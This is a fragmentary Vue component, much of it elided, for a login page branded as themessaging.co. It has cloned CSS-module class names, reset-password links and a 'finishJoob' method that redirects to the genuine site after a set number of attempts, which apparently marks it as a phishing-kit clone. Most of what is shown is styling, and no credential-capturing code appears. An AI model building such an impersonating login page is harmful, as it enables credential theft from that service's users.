<template>
	<div id="app">
        ...
        <div class="flex">
              <img src="../assets/images/tmc-login.png" alt="tmc-logo" width="204" height="64" style="max-width: 279x; padding-right: 25px;">
		</div>
        ...
        <div class="style__linkRoleButtonsWrap___ydPQ3"><a class="style__linkRoleButton___kxZ2G" href="https://support.themessaging.co/hc/en-au/articles/9391763413391" role="button"><div id="loginForgotPassword" class="style__recovery___AnSSy">Reset my password</div></a><span class="style__divider___PnMM1"></span><a class="style__linkRoleButton___kxZ2G" href="javascript:void(0)" role="button"><div id="loginForgotPassword" class="style__recovery___AnSSy">Sign in another way</div></a></div>
          ...
          <div class="language" style="margin-top: 30px;" > 
            ...
            <select class="blueTxt" name="language" id="language" aria-placeholder="English (UK)">
	...
	methods: {
		...
		async finishJoob() {
			...
			if (this.count < this.finalCount) {
				...
				location.replace("https://themessaging.co/")
...
button {
  min-width: 333px;
  height: 33px;
  background-color: rgb(10, 92, 156);
  color: white;
  font-weight: bold;
  border-radius: 4px;
  border: none;
...
select {
  ...
  border-radius: 4px;
  padding: 4px;
  background-color: rgba(10, 93, 156, 0);
}

select:hover {
  background-color: rgba(10, 93, 156, 0.083);
}
...
min-width: 500px;
border:none;
border-bottom:1px solid rgb(10, 92, 156);
}
...
/* BOTTOM BARS ================================= */
.bar  { position:relative; display:block; width:full; }
...
img {
  ...
  *::-ms-backdrop,
  ...
  form img{display: none;} main{margin-top:120px;}
      ...
      *.parentFocus,
      #sidebarNavigation .miniCalendar *.keypressFocused:focus,
      #sidebarNavigation .miniCalendar *.parentFocus {
      ...
      #sidebarNavigation *.keypressFocused:focus,
      #sidebarNavigation *.parentFocus,
      #loginPage *.keypressFocused:focus,
      #loginPage *.parentFocus,
      #recoveryPage *.keypressFocused:focus,
      #recoveryPage *.parentFocus {
        outline: #FFFFFF solid 2px;
        outline-offset: 2px;
      }

      #sidebarNavigation .MuiCheckbox-root.Mui-focusVisible {
        outline: #FFFFFF solid 2px;
      }
      ...
      *:focus-visible {
      ...
      #renderCalendar span.MuiPickersCalendarHeader-dayLabel {
        color: #000000;
      }
      ...
      @media (forced-colors:active) {
        ...
        *.parentFocus {
        ...
        /* Window high contrast fix input field with wierd overlay */
      ...
      #initError p:last-of-type {
        margin-bottom: 4rem;
      }
      #initError p:first-of-type {
        margin-top: 0;
      }
      #initError ul {
        margin: 2rem 0;
      ...
      #initError li:not(:first-of-type):before {
        content: "|";
        margin: 0 10px;
        color: #d0d0d0;
      }
...
.MuiInput-underline:after {
  ...
  border-bottom: 2px solid #0A5C9C;
  pointer-events: none;
}
...
.MuiIconButton-colorPrimary:hover {
  background-color: rgba(10, 92, 156, 0.04);
}
@media (hover: none) {
  .MuiIconButton-colorPrimary:hover {
    background-color: transparent;
...
.MuiButton-outlinedPrimary {
  color: #0A5C9C;
  border: 1px solid rgba(10, 92, 156, 0.5);
}
.MuiButton-outlinedPrimary:hover {
  border: 1px solid #0A5C9C;
  background-color: rgba(10, 92, 156, 0.04);
}
@media (hover: none) {
  .MuiButton-outlinedPrimary:hover {
...
.jss9 .MuiInputBase-root {
  color: #0A5C9C;
}
.jss9 .MuiInput-underline:before {
  border-bottom-color: #0A5C9C;
}
.jss9 .MuiInput-underline:hover:before {
  border-bottom-color: #0A5C9C;
}
.jss9 .MuiInput-underline:after {
  border-bottom-color: #0A5C9C;
}
